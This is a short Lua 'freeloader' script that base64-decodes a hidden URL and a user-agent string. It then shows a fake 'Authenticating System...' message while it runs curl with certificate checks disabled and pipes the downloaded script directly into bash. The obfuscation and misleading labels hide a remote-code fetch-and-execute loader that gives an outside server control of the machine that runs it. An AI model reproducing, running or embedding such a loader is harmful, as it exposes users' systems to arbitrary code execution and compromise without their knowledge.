-- =============================================================
-- 🚀 SCLOUDS-OMNI v12 - FREELOADER (DEBUG)
-- =============================================================

local function decode(str)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        return string.char(tonumber(x, 2))
    end))
end

-- Debug Files Logs
local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")

os.execute("clear")
print("\27[1;36m[ScloudsOmni]\27[0m Authenticating System...")

-- Execute The Bash
local cmd = "curl -sL -k -A '" .. ident .. "' '" .. target .. "' | bash"

local status = os.execute(cmd)

if not status then
    print("\27[31m[ERROR]\27[0m Failed to reach Omni Server.")
end
